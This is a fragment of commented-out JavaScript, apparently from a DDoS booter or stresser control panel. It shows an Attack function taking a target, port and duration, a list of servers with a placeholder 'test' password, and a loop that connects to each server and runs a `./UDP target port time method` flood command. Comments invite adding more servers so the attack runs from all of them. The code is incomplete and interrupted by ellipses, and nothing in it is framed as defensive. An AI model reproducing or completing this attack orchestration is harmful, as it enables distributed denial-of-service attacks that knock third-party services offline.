...
// // function Attack(auth_token, ip, target, port, time) {
// //     if (IsAttacking(null, auth_token)) {
// //         return false;
// //     }
...
//             password: 'test'
//         }
//         // put a , and the nest set of server info to support more then one servers
//         // Add more servers as needed it will execute to all the servers
//     ];

//     servers.forEach(server => {
//         const command = `./UDP ${target} ${port} ${time} ${method}`;
//         const conn = new Client();
